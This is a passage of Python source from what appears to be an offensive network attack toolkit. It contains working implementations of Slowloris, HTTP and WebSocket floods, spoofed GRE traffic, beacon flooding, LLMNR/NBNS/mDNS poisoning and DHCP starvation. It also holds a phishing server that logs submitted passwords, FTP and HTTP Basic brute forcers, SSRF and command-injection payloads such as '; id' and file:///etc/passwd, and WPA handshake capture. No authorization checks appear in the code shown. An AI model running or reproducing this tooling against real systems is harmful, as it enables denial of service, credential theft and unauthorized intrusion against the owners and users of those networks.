    async def beacon_flood(self, ssids=None, iface="wlan0mon", duration=30, pps=100, **kwargs):
        if ssids is None:
            ssids = ["FreeWiFi","Guest","Public","NetWARRIOR","Open","SecureNet"]
        name = "beacon_flood"
        att = self.registry.create(name)
        self.log.add(f"Beacon flood {len(ssids)} SSIDs on {iface}", tag="WIFI")
        def gen():
            while True:
                for ssid in ssids:
                    yield RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=Utils.rand_mac(), addr3=Utils.rand_mac()) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=ssid.encode())
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True, iface=iface)
        return att

    # ---- GRE ----
    async def gre_ip_spoof(self, target, payload_size=64, duration=30, pps=1000, **kwargs):
        name = f"gre_{target}"
        att = self.registry.create(name)
        self.log.add(f"GRE spoof {target}", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / GRE(proto=0x0800) / IP(src=Utils.rand_ip(), dst=target) / Utils.rand_payload(payload_size)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    # ---- PCAP replay ----
    async def replay_pcap(self, pcap_file, duration=30, pps=1000, **kwargs):
        name = "pcap_replay"
        att = self.registry.create(name)
        if not os.path.isfile(pcap_file):
            self.log.add(f"PCAP file not found: {pcap_file}", level="error")
            att.stop()
            return att
        try:
            packets = rdpcap(pcap_file)
            if not packets:
                self.log.add("PCAP empty", level="error")
                att.stop()
                return att
            self.log.add(f"Replaying {pcap_file} ({len(packets)} packets)", tag="ATTACK")
            def gen():
                while True:
                    for pkt in packets:
                        yield pkt
            await self.engine.send_loop(gen(), duration, pps, name)
        except Exception as e:
            self.log.add(f"Replay error: {e}", level="error")
            att.stop()
        return att

    # ---- Application Layer ----
    async def _sleep(self, att, seconds, step=1.0):
        """Sleep that returns early when the attack is stopped."""
        loop = asyncio.get_running_loop()
        end = loop.time() + seconds
        while att.running and not self.engine._stop.is_set():
            remaining = end - loop.time()
            if remaining <= 0:
                break
            await asyncio.sleep(min(step, remaining))

    async def _open(self, target, port):
        return await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)

    async def slowloris(self, target, port=80, socket_count=200, duration=30, keepalive=10, **kwargs):
        name = f"slowloris_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"Slowloris {target}:{port} with {socket_count} sockets", tag="APP")
        header = (
            f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Accept-language: en-US\r\n"
        )
        sockets = []
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration
        try:
            for _ in range(socket_count):
                try:
                    _, writer = await self._open(target, port)
                    writer.write(header.encode())
                    await writer.drain()
                    sockets.append(writer)
                    att.inc_sent(1)
                except Exception:
                    att.inc_errors()
            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                for writer in sockets[:]:
                    try:
                        writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        await writer.drain()
                        att.inc_sent(1)
                    except Exception:
                        sockets.remove(writer)
                        try:
                            writer.close()
                        except Exception:
                            pass
                # top the pool back up as the server drops connections
                while len(sockets) < socket_count and att.running and loop.time() < deadline:
                    try:
                        _, writer = await self._open(target, port)
                        writer.write(header.encode())
                        await writer.drain()
                        sockets.append(writer)
                    except Exception:
                        break
                await self._sleep(att, keepalive)
        finally:
            for writer in sockets:
                try:
                    writer.close()
                except Exception:
                    pass
            att.stop()
        return att

    async def http_flood(self, target, port=80, threads=20, duration=30, **kwargs):
        name = f"http_flood_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"HTTP flood {target}:{port} with {threads} workers", tag="APP")
        urls = ["/", "/index.html", "/login", "/api", "/search?q=test", "/about", "/contact"]
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration
        timeout = aiohttp.ClientTimeout(total=5)

        async def worker():
            async with aiohttp.ClientSession(timeout=timeout) as session:
                while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                    try:
                        url = f"http://{target}:{port}{random.choice(urls)}"
                        async with session.get(url) as resp:
                            await resp.read()
                        att.inc_sent(1)
                    except Exception:
                        att.inc_errors()
        try:
            await asyncio.gather(*[worker() for _ in range(threads)], return_exceptions=True)
        finally:
            att.stop()
        return att

    async def rudy_attack(self, target, port=80, duration=30, sockets=20, **kwargs):
        name = f"rudy_{target}_{port}"
        att = self.registry.create(name)
        url = f"http://{target}:{port}/"
        self.log.add(f"RUDY attack {url}", tag="APP")
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration
        timeout = aiohttp.ClientTimeout(total=10)

        async def worker():
            async with aiohttp.ClientSession(timeout=timeout) as session:
                data = {"username": ""}
                while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                    try:
                        async with session.post(url, data=data) as resp:
                            await resp.content.read(1)
                        att.inc_sent(1)
                    except Exception:
                        att.inc_errors()
                    await self._sleep(att, 10)
        try:
            await asyncio.gather(*[worker() for _ in range(sockets)], return_exceptions=True)
        finally:
            att.stop()
        return att

    async def slow_read(self, target, port=80, duration=30, sockets=20, **kwargs):
        name = f"slow_read_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"Slow Read {target}:{port}", tag="APP")
        socks = []
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration
        try:
            for _ in range(sockets):
                try:
                    _, writer = await self._open(target, port)
                    writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                    await writer.drain()
                    socks.append(writer)
                except Exception:
                    att.inc_errors()
            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                for writer in socks[:]:
                    try:
                        writer.write(b"\x00")
                        await writer.drain()
                        att.inc_sent(1)
                    except Exception:
                        socks.remove(writer)
                await self._sleep(att, 5)
        finally:
            for writer in socks:
                try:
                    writer.close()
                except Exception:
                    pass
            att.stop()
        return att

    async def http2_rapid_reset(self, target, port=80, duration=30, **kwargs):
        name = f"http2_reset_{target}_{port}"
        att = self.registry.create(name)
        url = f"http://{target}:{port}/"
        self.log.add(f"HTTP/2 rapid reset {url}", tag="APP")
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration
        timeout = aiohttp.ClientTimeout(total=2)
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                    try:
                        async with session.get(url) as resp:
                            await resp.read()
                        att.inc_sent(1)
                    except Exception:
                        att.inc_errors()
                    await asyncio.sleep(0.01)
        finally:
            att.stop()
        return att

    async def websocket_flood(self, target, port=80, duration=30, sockets=20, **kwargs):
        name = f"websocket_flood_{target}_{port}"
        att = self.registry.create(name)
        ws_url = f"ws://{target}:{port}/"
        self.log.add(f"WebSocket flood {ws_url}", tag="APP")
        req = (
            f"GET / HTTP/1.1\r\nHost: {target}\r\nUpgrade: websocket\r\n"
            f"Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n"
        ).encode()
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration

        async def worker():
            try:
                _, writer = await self._open(target, port)
                writer.write(req)
                await writer.drain()
                await self._sleep(att, 2)
                writer.close()
                await writer.wait_closed()
                att.inc_sent(1)
            except Exception:
                att.inc_errors()
        try:
            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                # one bounded wave at a time so tasks and fds do not pile up
                await asyncio.gather(*[worker() for _ in range(sockets)], return_exceptions=True)
        finally:
            att.stop()
        return att

    # ---- Responder-style Poisoning ----
    async def llmnr_poison(self, target, domain="wpad.local", duration=30, **kwargs):
        att_name = f"llmnr_{target}"
        att = self.registry.create(att_name)
        self.log.add(f"LLMNR poison {domain} -> {target}", tag="POISON")
        def gen():
            while True:
                yield IP(src=target, dst="224.0.0.252") / UDP(sport=Utils.rand_port(), dport=5355) / DNS(
                    id=random.randint(0,65535), qr=1, aa=1,
                    qd=DNSQR(qname=domain),
                    an=DNSRR(rrname=domain, rdata=target, ttl=60)
                )
        await self.engine.send_loop(gen(), duration, 10, att_name)
        return att

    async def nbns_poison(self, target, name="WPAD", duration=30, **kwargs):
        att_name = f"nbns_{target}"
        att = self.registry.create(att_name)
        self.log.add(f"NBNS poison {name} -> {target}", tag="POISON")
        def gen():
            while True:
                payload = b"\x00\x00\x00\x00\x01\x00\x00\x01" + \
                          name.ljust(16).encode() + b"\x00" + b"\x00\x20\x00\x01" + \
                          socket.inet_aton(target)
                yield IP(src=target, dst="255.255.255.255") / UDP(sport=137, dport=137) / Raw(payload)
        await self.engine.send_loop(gen(), duration, 10, att_name)
        return att

    async def mdns_poison(self, target, domain="_http._tcp.local", duration=30, **kwargs):
        att_name = f"mdns_{target}"
        att = self.registry.create(att_name)
        self.log.add(f"mDNS poison {domain} -> {target}", tag="POISON")
        def gen():
            while True:
                yield IP(src=target, dst="224.0.0.251") / UDP(sport=5353, dport=5353) / DNS(
                    qr=1, aa=1,
                    qd=DNSQR(qname=domain),
                    an=DNSRR(rrname=domain, rdata=target)
                )
        await self.engine.send_loop(gen(), duration, 10, att_name)
        return att

    # ---- DHCP Starvation ----
    async def dhcp_starvation(self, target=None, duration=30, pps=10, **kwargs):
        name = "dhcp_starvation"
        att = self.registry.create(name)
        self.log.add(f"DHCP starvation @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                mac = Utils.rand_mac()
                hw = bytes.fromhex(mac.replace(":", ""))
                yield (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                       IP(src="0.0.0.0", dst="255.255.255.255") /
                       UDP(sport=68, dport=67) /
                       BOOTP(chaddr=hw, xid=random.randint(1, 0xFFFFFFFF), flags=0x8000) /
                       DHCP(options=[("message-type", "discover"), "end"]))
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    # ---- Social Engineering ----
    async def start_phishing_server(self, bind_ip="0.0.0.0", port=8080,
                                    credential_file=None, duration=60, **kwargs):
        from aiohttp import web
        name = "phishing"
        att = self.registry.create(name)
        if credential_file is None:
            out = self.engine.config.output_dir
            try:
                out.mkdir(parents=True, exist_ok=True)
            except Exception:
                out = Path(".")
            credential_file = str(out / "captured_creds.txt")
        self.log.add(f"Phishing server on {bind_ip}:{port} -> {credential_file}", tag="SOCIAL")

        async def handle_login(request):
            data = await request.post()
            username = data.get("username", "")
            password = data.get("password", "")
            try:
                with open(credential_file, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.datetime.now().isoformat()}\t{username}\t{password}\n")
                att.add_finding({"username": username})
                att.inc_recv(1)
                self.log.add(f"Phishing: captured submission for '{username}'", tag="SOCIAL")
            except Exception as e:
                self.log.add(f"Phishing: write failed ({e})", level="error")
            return web.Response(text="Login failed", status=401)

        runner = None
        try:
            app = web.Application()
            app.router.add_post("/login", handle_login)
            runner = web.AppRunner(app)
            await runner.setup()
            await web.TCPSite(runner, bind_ip, port).start()
            self.log.add(f"Phishing site at http://{bind_ip}:{port}/login", tag="SOCIAL")
            await self._sleep(att, duration)
        except Exception as e:
            self.log.add(f"Phishing server error: {e}", level="error")
        finally:
            if runner is not None:
                await runner.cleanup()
            att.stop()
        return att

    # ---- Cloud Recon ----
    async def cloud_recon(self, target_ips=None, duration=30, **kwargs):
        name = "cloud_recon"
        att = self.registry.create(name)
        if not target_ips:
            target_ips = [self.net.ip, self.net.gateway]
        target_ips = [ip for ip in target_ips if ip and ip != "0.0.0.0"]
        self.log.add(f"Cloud recon on {', '.join(target_ips)}", tag="CLOUD")
        providers = ["amazon", "aws", "azure", "microsoft", "google", "gcp",
                     "digitalocean", "linode", "hetzner", "ovh", "oracle", "cloudflare"]
        results = {}
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for ip in target_ips:
                if not att.running:
                    break
                try:
                    async with session.get(f"http://ip-api.com/json/{ip}") as resp:
                        data = await resp.json()
                    org = f"{data.get('org', '')} {data.get('isp', '')} {data.get('as', '')}".strip()
                    if any(p in org.lower() for p in providers):
                        results[ip] = org
                        att.add_finding({"ip": ip, "org": org})
                except Exception:
                    att.inc_errors()
                att.inc_sent(1)
        self.log.add(f"Cloud recon: {results or 'no cloud providers identified'}", tag="CLOUD")
        att.stop()
        return att

    # ---- SSHTunnel (connection check only; port forwarding not implemented) ----
    async def ssh_tunnel(self, host, username, password=None, keyfile=None,
                         remote_port=22, local_port=1080, duration=30, **kwargs):
        att = self.registry.create("ssh_tunnel")
        self.log.add(f"SSH tunnel {host}:{remote_port} (connection check only)", tag="TUNNEL")

        def connect():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if password:
                client.connect(host, port=remote_port, username=username,
                               password=password, timeout=5, allow_agent=False, look_for_keys=False)
            elif keyfile:
                client.connect(host, port=remote_port, username=username,
                               key_filename=keyfile, timeout=5)
            else:
                raise ValueError("password or keyfile required")
            return client

        loop = asyncio.get_running_loop()
        try:
            client = await loop.run_in_executor(None, connect)
        except Exception as e:
            self.log.add(f"SSH tunnel error: {e}", level="error")
            att.stop()
            return att
        self.log.add("SSH connection established (port forwarding not implemented)", tag="TUNNEL")
        try:
            await self._sleep(att, duration)
        finally:
            await loop.run_in_executor(None, client.close)
            att.stop()
        return att

    # ---- Passive Capture ----
    async def passive_capture(self, interface=None, duration=30, **kwargs):
        name = "passive_capture"
        att = self.registry.create(name)
        self.log.add(f"Passive capture on {interface or 'default'}", tag="CAPTURE")
        seen = set()
        def packet_handler(pkt):
            att.inc_recv(1)
            if pkt.haslayer(Raw):
                data = bytes(pkt[Raw].load)
                if b"Authorization: Basic" in data and data[:64] not in seen:
                    seen.add(data[:64])
                    att.add_finding({"type": "Basic Auth", "data": data[:120].hex()})
                    self.log.add("Found HTTP Basic Auth header", tag="CAPTURE")
        try:
            await self._run_sniff(att, iface=interface, timeout=duration, prn=packet_handler)
        finally:
            att.stop()
        return att

    # ---- Network Performance ----
    async def network_perf(self, target, port=80, duration=30, **kwargs):
        name = f"network_perf_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"Network performance test {target}:{port}", tag="PERF")
        loop = asyncio.get_running_loop()
        deadline = loop.time() + duration
        recv = 0
        timeout = aiohttp.ClientTimeout(total=2)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while att.running and not self.engine._stop.is_set() and loop.time() < deadline:
                try:
                    async with session.get(f"http://{target}:{port}/") as resp:
                        data = await resp.read()
                        recv += len(data)
                        att.inc_sent(1)
                        att.inc_recv(1)
                        att.inc_bytes_recv(len(data))
                except Exception:
                    att.inc_errors()
        self.log.add(
            f"Performance: {att.packets_sent} requests, {Utils.human_size(recv)} received",
            tag="PERF")
        att.stop()
        return att

    # ---- External Wrappers ----
    async def _run_external(self, att, tool, cmd, timeout):
        """Run an external tool, killing it if it overruns `timeout` seconds."""
        if shutil.which(cmd[0]) is None:
            self.log.add(f"{tool}: '{cmd[0]}' not found on PATH", level="error")
            return
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
        except Exception as e:
            self.log.add(f"{tool}: failed to launch ({e})", level="error")
            return
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            self.log.add(f"{tool}: timed out after {timeout}s, process killed", level="warn")
            return
        except asyncio.CancelledError:
            proc.kill()
            raise
        out = stdout.decode(errors="ignore")
        self.log.add(f"{tool} finished (exit {proc.returncode}); {len(out)} bytes output", tag="EXTERNAL")
        att.add_finding({"tool": tool, "exit": proc.returncode,
                         "stdout": out, "stderr": stderr.decode(errors="ignore")})

    async def nmap_wrapper(self, target, args="-sV", duration=120, **kwargs):
        name = "nmap_wrapper"
        att = self.registry.create(name)
        self.log.add(f"nmap {target} {args}", tag="EXTERNAL")
        try:
            await self._run_external(att, "nmap", ["nmap", *shlex.split(args), target], duration)
        finally:
            att.stop()
        return att

    async def sqlmap_wrapper(self, url, args="--batch", duration=120, **kwargs):
        name = "sqlmap_wrapper"
        att = self.registry.create(name)
        self.log.add(f"sqlmap {url} {args}", tag="EXTERNAL")
        try:
            await self._run_external(att, "sqlmap", ["sqlmap", "-u", url, *shlex.split(args)], duration)
        finally:
            att.stop()
        return att

    # ---- FTP Brute (streaming, returns att) ----
    async def ftp_brute(self, host, user, wordlist_path, port=21, concurrency=20, **kwargs):
        name = "ftp_brute"
        att = self.registry.create(name)
        self.log.add(f"FTP brute {host}:{port} user {user}", tag="PENTEST")
        if not os.path.isfile(wordlist_path):
            self.log.add("Wordlist not found", level="error")
            att.stop()
            return att
        sem = asyncio.Semaphore(concurrency)
        found = None

        async def try_pass(pwd):
            nonlocal found
            if found:
                return
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(host, port)
                    await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
                    writer.write(f"USER {user}\r\n".encode())
                    await writer.drain()
                    await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
                    writer.write(f"PASS {pwd}\r\n".encode())
                    await writer.drain()
                    resp = await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
                    if b"230" in resp:
                        found = pwd
                        self.log.add(f"FTP password found: {pwd}", tag="PENTEST")
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        with open(wordlist_path, 'r') as f:
            tasks = []
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                tasks.append(asyncio.create_task(try_pass(pwd)))
                if len(tasks) >= concurrency * 2:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                if found:
                    break
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        if found:
            att.add_finding({"password": found})
        att.stop()
        return att

    # ---- HTTP Basic Brute (streaming) ----
    async def http_basic_brute(self, url, user_wordlist, pass_wordlist, concurrency=20, **kwargs):
        name = "http_basic_brute"
        att = self.registry.create(name)
        self.log.add(f"HTTP Basic brute {url}", tag="PENTEST")
        if not os.path.isfile(user_wordlist) or not os.path.isfile(pass_wordlist):
            self.log.add("Wordlist not found", level="error")
            att.stop()
            return att
        found = None
        sem = asyncio.Semaphore(concurrency)

        async def try_auth(user, pwd):
            nonlocal found
            if found:
                return
            async with sem:
                try:
                    auth = aiohttp.BasicAuth(user, pwd)
                    async with aiohttp.ClientSession(auth=auth) as session:
                        async with session.get(url, timeout=5) as resp:
                            if resp.status == 200:
                                found = (user, pwd)
                                self.log.add(f"HTTP Basic credentials found: {user}:{pwd}", tag="PENTEST")
                except Exception:
                    pass

        with open(user_wordlist, 'r') as uf:
            for user in uf:
                user = user.strip()
                if not user:
                    continue
                with open(pass_wordlist, 'r') as pf:
                    tasks = []
                    for pwd in pf:
                        pwd = pwd.strip()
                        if not pwd:
                            continue
                        tasks.append(asyncio.create_task(try_auth(user, pwd)))
                        if len(tasks) >= concurrency * 2:
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
                        if found:
                            break
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                if found:
                    break
        if found:
            att.add_finding({"credentials": found})
        att.stop()
        return att

    # ---- SSRF Scanner ----
    async def ssrf_scan(self, url, params, payloads=None, **kwargs):
        if payloads is None:
            payloads = [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://[::1]/", "file:///etc/passwd",
            ]
        name = "ssrf_scan"
        att = self.registry.create(name)
        self.log.add(f"SSRF scan on {url}", tag="PENTEST")
        # signatures that only appear if the server actually fetched an internal resource
        signals = ("ami-id", "instance-id", "iam/security-credentials",
                   "computeMetadata", "root:x:0:0:")
        found = []
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for param in params:
                for payload in payloads:
                    try:
                        async with session.get(url, params={param: payload}) as resp:
                            text = await resp.text()
                        hit = next((s for s in signals if s in text), None)
                        if hit:
                            found.append({"param": param, "payload": payload, "signal": hit})
                    except Exception:
                        pass
        if found:
            att.add_finding({"vulnerabilities": found})
        att.stop()
        return att

    # ---- Command Injection Scanner ----
    async def cmd_injection_scan(self, url, params, payloads=None, **kwargs):
        marker = f"nw{random.randint(100000, 999999)}"
        if payloads is None:
            payloads = [f"; echo {marker}", f"| echo {marker}", f"&& echo {marker}",
                        f"$(echo {marker})", "; id"]
        name = "cmd_injection_scan"
        att = self.registry.create(name)
        self.log.add(f"Command injection scan on {url}", tag="PENTEST")
        found = []
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for param in params:
                for payload in payloads:
                    try:
                        async with session.get(url, params={param: payload}) as resp:
                            text = await resp.text()
                        if marker in text or re.search(r"uid=\d+\([^)]+\) gid=\d+", text):
                            found.append({"param": param, "payload": payload,
                                          "response": text[:120]})
                    except Exception:
                        pass
        if found:
            att.add_finding({"vulnerabilities": found})
        att.stop()
        return att

    # ---- Exploit Engine (Interactive SSH) ----
    async def exploit_ssh(self, host, port=22, username=None, password=None, keyfile=None, **kwargs):
        name = "exploit_ssh"
        att = self.registry.create(name)
        self.log.add(f"Launching SSH interactive shell to {host}:{port}", tag="EXPLOIT")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if password:
                client.connect(host, port=port, username=username, password=password, timeout=5)
            elif keyfile:
                client.connect(host, port=port, username=username, key_filename=keyfile, timeout=5)
            else:
                self.log.add("SSH shell requires credentials", level="error")
                att.stop()
                return att
            stdin, stdout, stderr = client.exec_command("id")
            output = stdout.read().decode()
            self.log.add(f"SSH command output: {output}", tag="EXPLOIT")
            att.add_finding({"output": output})
            client.close()
        except Exception as e:
            self.log.add(f"SSH exploit error: {e}", level="error")
        att.stop()
        return att

    # ---- Wireless Audit (Handshake capture) ----
    async def wireless_handshake_capture(self, iface="wlan0mon", bssid=None, duration=30, **kwargs):
        name = "wireless_handshake"
        att = self.registry.create(name)
        self.log.add(f"Capturing WPA handshake on {iface} for {duration}s", tag="WIFI")
        handshake = []
        def pkt_handler(pkt):
            if pkt.haslayer(EAPOL):
                handshake.append(pkt)
                self.log.add("Captured EAPOL frame", tag="WIFI")
                att.inc_recv(1)
        try:
            await self._run_sniff(att, iface=iface, timeout=duration, prn=pkt_handler)
            att.add_finding({"handshake_packets": len(handshake)})
            self.log.add(f"Captured {len(handshake)} EAPOL frames", tag="WIFI")
        finally:
            att.stop()
        return att

    async def _run_sniff(self, att, timeout=30, **sniff_kwargs):
        """
        Run scapy sniff() off the event loop in short slices so a stop request (or
        process exit) is honoured within ~2s instead of blocking for the full
        capture window on a quiet link.
        """
        sniff_kwargs.setdefault("store", False)
        sniff_kwargs.setdefault(
            "stop_filter",
            lambda _p: (not att.running) or self.engine._stop.is_set(),
        )
        loop = asyncio.get_running_loop()
        end = loop.time() + max(0, timeout)
        while att.running and not self.engine._stop.is_set():
            slice_t = min(2.0, end - loop.time())
            if slice_t <= 0:
                break
            try:
                await loop.run_in_executor(
                    None, lambda st=slice_t: sniff(timeout=st, **sniff_kwargs))
            except Exception as e:
                self.log.add(f"{att.name}: capture failed ({e})", level="error")
                return

    # ---- AutoEscalate (stub) ----
    async def auto_escalate(self, target=None, **kwargs):
        att = self.registry.create("auto_escalate")
        self.log.add("Auto-escalate is not implemented", level="warn", tag="ESCALATE")
        att.stop()
        return att

    # ---- Traffic Monitor ----
    async def traffic_monitor(self, interface=None, duration=30, **kwargs):
        name = "traffic_monitor"
        att = self.registry.create(name)
        self.log.add(f"Traffic monitor on {interface or 'default'}", tag="MONITOR")
        stats = {"packets": 0, "bytes": 0, "start": time.time()}
        def pkt_handler(pkt):
            stats["packets"] += 1
            stats["bytes"] += len(pkt)
            att.inc_recv(1)
            att.inc_bytes_recv(len(pkt))
        try:
            await self._run_sniff(att, iface=interface, timeout=duration, prn=pkt_handler)
            elapsed = max(1e-6, time.time() - stats["start"])
            self.log.add(
                f"Traffic: {stats['packets']} pkts, {Utils.human_size(stats['bytes'])} "
                f"in {elapsed:.1f}s", tag="MONITOR")
        finally:
            att.stop()
        return att

    # ---- Bandwidth Meter ----
    async def bandwidth_meter(self, duration=30, **kwargs):
        name = "bandwidth_meter"
        att = self.registry.create(name)
        self.log.add(f"Bandwidth meter for {duration}s", tag="MONITOR")
        try:
            c0 = psutil.net_io_counters()
            t0 = time.time()
            await self._sleep(att, duration)
            c1 = psutil.net_io_counters()
            elapsed = max(1e-6, time.time() - t0)
            delta = (c1.bytes_recv + c1.bytes_sent) - (c0.bytes_recv + c0.bytes_sent)
            self.log.add(f"Bandwidth: {Utils.human_size(delta / elapsed)}/s "
                         f"over {elapsed:.1f}s", tag="MONITOR")
            att.add_finding({"bytes": delta, "seconds": elapsed})
        finally:
            att.stop()
        return att

    # ---- Connection Table (returns findings) ----
    async def connection_table(self, **kwargs):
        name = "connection_table"
        att = self.registry.create(name)
        self.log.add("Showing connection table", tag="MONITOR")
        try:
            connections = psutil.net_connections()
        except Exception as e:
            self.log.add(f"Connection table unavailable ({e})", level="error")
            att.stop()
            return att
        table = Table(title="Active Connections")
        table.add_column("FD", style="cyan")
        table.add_column("Family", style="green")
        table.add_column("Type", style="yellow")
        table.add_column("LAddr", style="magenta")
        table.add_column("RAddr", style="red")
        table.add_column("Status", style="blue")
        for conn in connections:
            if conn.laddr and conn.raddr:
                table.add_row(
                    str(conn.fd) if conn.fd else "-",
                    getattr(conn.family, "name", str(conn.family)),
                    getattr(conn.type, "name", str(conn.type)),
                    f"{conn.laddr.ip}:{conn.laddr.port}",
                    f"{conn.raddr.ip}:{conn.raddr.port}",
                    conn.status,
                )
        cap = StringIO()
        Console(file=cap, highlight=False, width=100).print(table)
        att.add_finding({"table": cap.getvalue()})
        att.stop()
        return att

    # ---- Stubs: declared in the dispatch table but not implemented ----
    async def chaos_mode(self, target=None, duration=30, **kwargs):
        att = self.registry.create("chaos")
        self.log.add("Chaos mode is not implemented", level="warn", tag="CHAOS")
        att.stop()
        return att

# ──────────────────────────────────────────────────────────────────────────────
# RECON
# ──────────────────────────────────────────────────────────────────────────────
class Recon:
    def __init__(self, config: Config, net: NetworkContext, log: LogBus):
        self.config = config
        self.net = net
        self.log = log
        self.loop = asyncio.get_running_loop()

    async def port_scan(self, host: str, ports: List[int], concurrency: int = 200,
                        timeout: float = 2.0) -> List[int]:
        sem = asyncio.Semaphore(concurrency)
        async def scan_one(p):
            async with sem:
                try:
                    _, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, p), timeout=timeout)
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    return p
                except Exception:
                    return None
        results = await asyncio.gather(*(scan_one(p) for p in ports))
        return sorted(p for p in results if p is not None)

    async def _banner(self, ip: str, port: int, timeout: float = 2.0) -> Optional[str]:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout)
        except Exception:
            return None
        try:
            if port in (80, 8080, 8000):
                writer.write(f"HEAD / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
                await writer.drain()
            data = await asyncio.wait_for(reader.read(512), timeout=timeout)
            return data.decode(errors="replace").strip() or None
        except Exception:
            return None
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def fingerprint(self, ip: str) -> Dict:
        result = {"ip": ip, "ports": [], "banners": {}, "os": "Unknown", "ttl": None}

        def _icmp_ttl():
            try:
                reply = sr1(IP(dst=ip) / ICMP(), timeout=2, verbose=0)
                return reply.ttl if reply else None
            except Exception:
                return None

        common = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5900, 6379, 8080, 8443]
        ttl, ports = await asyncio.gather(
            self.loop.run_in_executor(None, _icmp_ttl),
            self.port_scan(ip, common, timeout=2.0),
        )
        if ttl is not None:
            result["ttl"] = ttl
            # Guess the sender's initial TTL (64/128/255) allowing for a few hops.
            if ttl <= 64:
                result["os"] = "Linux/Unix"
            elif ttl <= 128:
                result["os"] = "Windows"
            else:
                result["os"] = "Network device"
        result["ports"] = ports
        banners = await asyncio.gather(*(self._banner(ip, p) for p in ports))
        result["banners"] = {p: b for p, b in zip(ports, banners) if b}
        return result

    async def network_map(self, network: str, use_arp=True, use_ping=True,
                          max_hosts: int = 1024) -> Dict:
        try:
            net = ipaddress.ip_network(network, strict=False)
        except ValueError as e:
            self.log.add(f"network_map: invalid network {network!r} ({e})", level="error")
            return {}
        hosts = [str(h) for h in net.hosts()][:max_hosts]

        def _map():
            devices = {}
            if not hosts:
                return devices
            if use_arp:
                try:
                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=hosts),
                                 timeout=3, verbose=0)
                    for _, r in ans:
                        devices[r.psrc] = {"ip": r.psrc, "mac": r.hwsrc,
                                           "hostname": Utils.get_hostname(r.psrc)}
                except Exception as e:
                    self.log.add(f"network_map: ARP sweep failed ({e})", level="warn")
            if use_ping:
                remaining = [h for h in hosts if h not in devices]
                if remaining:
                    try:
                        # one batched send/receive instead of a per-host sr1() loop
                        ans, _ = sr([IP(dst=h) / ICMP() for h in remaining],
                                    timeout=3, verbose=0)
                        for _, r in ans:
                            devices.setdefault(r.src, {"ip": r.src, "mac": None,
                                                       "hostname": Utils.get_hostname(r.src)})
                    except Exception as e:
                        self.log.add(f"network_map: ping sweep failed ({e})", level="warn")
            return devices
        return await self.loop.run_in_executor(None, _map)

    def dns_lookup(self, domain, record_type="A", server=None):
        try:
            resolver = dns.resolver.Resolver()
            if server:
                resolver.nameservers = [server]
            answers = resolver.resolve(domain, record_type)
            return [str(r) for r in answers]
        except Exception as e:
            return [f"Error: {e}"]
